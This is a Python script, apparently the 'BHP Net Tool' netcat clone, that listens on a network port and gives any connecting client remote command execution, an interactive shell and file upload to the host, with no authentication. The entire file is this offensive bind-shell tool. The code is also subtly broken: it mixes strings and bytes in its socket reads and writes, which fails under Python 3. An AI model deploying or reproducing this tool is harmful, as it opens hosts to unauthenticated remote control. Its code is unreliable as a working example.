#!/usr/bin/env python3
import socket
import sys
import threading
import subprocess
import argparse

def main():
    parser = argparse.ArgumentParser(description='BHP Net Tool')
    parser.add_argument("host", help="target_host")
    parser.add_argument("port", help="port", type=int)
    parser.add_argument('-l', '--listen', action="store_true", help='listen on [host]:[post] for incoming connections')
    parser.add_argument('-e', '--execute', action="store", help='execute the given file upon receiving a connection')
    parser.add_argument('-c', '--command', action="store_true", help='intialized a command shell')
    parser.add_argument('-u', '--upload', action="store", help='upon receiving connection upload a file and write to [destination]')
    args = parser.parse_args()

    if not args.listen and args.host is not None and args.port > 0:
        buffer = sys.stdin.read()
        client_sender(args, buffer)

    if args.listen:
        server_loop(args)

def client_sender(args, buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((args.host, args.port))
        if len(buffer):
            client.send(buffer)

        while True:
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                
                if recv_len < 4096:
                    break

            print(response.decode(),)

            buffer = input("")
            buffer += "\n"
            client.send(buffer)

    except Exception as e:
        print(f"[*] Exception! Exiting. {e}")
        client.close()

def server_loop(args):
    if args.host is None:
        args.host = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((args.host, args.port))
    server.listen()
    print(f"[*] Listening on {args.host}:{args.port}")

    while True:
        client_socket, addr = server.accept()

        client_thread = threading.Thread(target=client_handler, args=(args, client_socket))
        client_thread.start()

def run_command(command):
    command = command.rstrip()

    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\n"

    return output

def client_handler(args, client_socket):

    if args.upload is not None:

        file_buffer = ""

        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(args.upload, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send(f"Successfully saved file to {args.upload}")
        except:
            client_socket.send(f"Failed to save file to {args.upload}")

    if args.execute is not None:
        output = run_command(args.execute)
        client_socket.send(output)

    if args.command:
        while True:
            client_socket.send(b"<BHP:#>")

            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            response = run_command(cmd_buffer)
            client_socket.send(response)

main()